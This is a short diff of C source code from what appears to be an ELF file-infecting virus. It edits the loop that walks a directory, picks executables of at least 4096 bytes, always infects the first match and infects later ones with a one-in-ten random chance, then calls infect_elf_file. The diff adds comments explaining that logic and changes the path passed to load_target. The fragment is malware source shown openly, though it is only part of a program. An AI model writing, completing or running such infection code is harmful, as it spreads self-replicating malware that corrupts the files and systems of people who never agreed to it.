@@ -801,13 +801,13 @@ rescan:
 			// 3. size>=4096 bytes
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
 				continue; //PER: criteria not matched, move on to next file in the directory 
-			if (icount == 0)
+			if (icount == 0) // PER: It is ensured that atleast one healthy file will be infected
 				goto infect;
 			rnum = get_random_number(10);
-                        if (rnum != LUCKY_NUMBER)
+                        if (rnum != LUCKY_NUMBER) //PER: 9/10 probability that rnum is not the LUCKY_NUMBER
                                 continue;
 infect:
-			load_target(fpath, &target);
+			load_target(&fpath[_strlen(dir) + 1], &target);
 			new_base = infect_elf_file(&self, &target);
 			unload_target(&target);
 #ifdef INFECT_PLTGOT
